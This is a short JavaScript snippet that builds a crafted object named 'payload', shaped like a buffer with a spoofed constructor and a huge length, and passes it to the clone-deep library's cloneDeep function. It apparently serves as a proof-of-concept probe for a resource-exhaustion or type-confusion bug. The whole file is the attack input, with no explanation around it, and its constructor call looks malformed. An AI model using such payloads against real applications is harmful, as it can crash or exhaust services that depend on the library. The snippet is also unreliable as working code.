const cloneDeep = require('clone-deep');

const payload = {
    "length": 100,
    "buffer": Buffer.from("WOOO"),
    "byteOffset": 0,
    "constructor": constructor({length: 9999999999999})
}

let copy = cloneDeep(payload);
console.log(payload.constructor)
